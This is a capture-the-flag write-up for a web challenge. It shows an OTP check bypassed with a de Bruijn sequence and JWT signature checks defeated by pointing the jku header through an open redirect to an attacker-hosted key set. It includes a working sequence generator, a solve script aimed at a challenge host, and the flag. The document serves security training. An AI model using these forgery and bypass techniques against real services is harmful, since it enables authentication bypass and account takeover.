---
ai_date: 2025-04-27 05:17:12
ai_summary: Bypassed OTP validation with de Bruijn sequence and manipulated JWT's jku field for key substitution.
ai_tags:
  - otp-bypass
  - jku-bypass
  - rsa
created: 2024-12-13T15:53
points: 900
updated: 2025-07-14T09:46
---

Fun OTP bypass + JKU bypass. Signing JWTs with our own private keys.
## OTP Bypass

Nice hints from the author.

```js [challenge/server/middleware/otpMiddleware.js]
// TODO: Is this secure enough?
if (!otp.includes(validOtp)) {
    reply.status(401).send({ error: 'Invalid OTP.' });
    return;
}
```

Well, how are the OTPs generated?

```js
export const generateOtp = () => {
  return Math.floor(1000 + Math.random() * 9000).toString();
};
```

They seem to be just 4 digit numbers.

Now there are different ways to make a string contain all possible 4 digit numbers.

But I'll be using [de Bruijn sequence - Wikipedia](https://en.wikipedia.org/wiki/De_Bruijn_sequence) to generate a sequence that is not 36000 characters long, (even though it contains `0XXX` which isn't needed but whatever).

```python
def de_bruijn(k: Iterable[str] | int, n: int) -> str:
    alphabet = k
    k = len(k)
    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1: p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    payload = "".join(alphabet[i] for i in sequence)
    return payload + payload[:n-1]
```

## JKU URL Bypass

Public keys are at `/.well-known/jwks.json`, and it is the `jku` field in the jwt header.

Changing it allows us to sign JWTs using our own private key, and the server will use our own public key to validate.

```js
// TODO: is this secure enough?
if (!jku.startsWith('http://127.0.0.1:1337/')) {
    throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
}
```

However the `jku` header is validated to must start with `http://127.0.0.1:1337/`.

How do we bypass this? Normal url injections like `@` would fail due to the presence of `/`.

Perhaps a redirect? Searching `redirect` gave me the answer, thank you author for all the hints.

This is the end point `http://127.0.0.1:1337/api/analytics/redirect?`

```js [challenge/server/routes/analytics.js]
fastify.get('/redirect', async (req, reply) => {
    const { url, ref } = req.query;

    if (!url || !ref) {
        return reply.status(400).send({ error: 'Missing URL or ref parameter' });
    }
    // TODO: Should we restrict the URLs we redirect users to?
    try {
        await trackClick(ref, decodeURIComponent(url));
        reply.header('Location', decodeURIComponent(url)).status(302).send();
    } catch (error) {
        console.error('[Analytics] Error during redirect:', error.message);
        reply.status(500).send({ error: 'Failed to track analytics data.' });
    }
});
```

## Solve

Combining them together we have the solve script!

Thank you author for making a solve script template!

```python [wrapper.py]
import requests
import datetime
import os
import jwt
from de_bruijn import de_bruijn

import json
from jwcrypto import jwk
from server import serve_file
from urllib.parse import urlencode

HOST = "http://94.237.48.253:46382"
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'
jku_url = f"http://127.0.0.1:1337/api/analytics/redirect?{urlencode({'ref': 'w', 'url': "https://1337.yun.ng/.well-known/jwks.json"})}"

kid = requests.get(f"{HOST}/.well-known/jwks.json").json()['keys'][0]['kid']
key = jwk.JWK.generate(kty='RSA', size=2048, alg='RS256', use='sig', kid=kid)
public_key = key.export_public()
stop = serve_file(json.dumps({'keys': [json.loads(public_key)]}).encode(), 1337, "application/json")
priv_key = key.export_to_pem(private_key=True, password=None)
otp = de_bruijn('0123456789', 4)

# ... THE ORIGINAL WRAPPER.PY...

stop()
```

```flag
HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_3dec65ba00edba8257236d8dffcf5c68}
```

Really loved the challenge!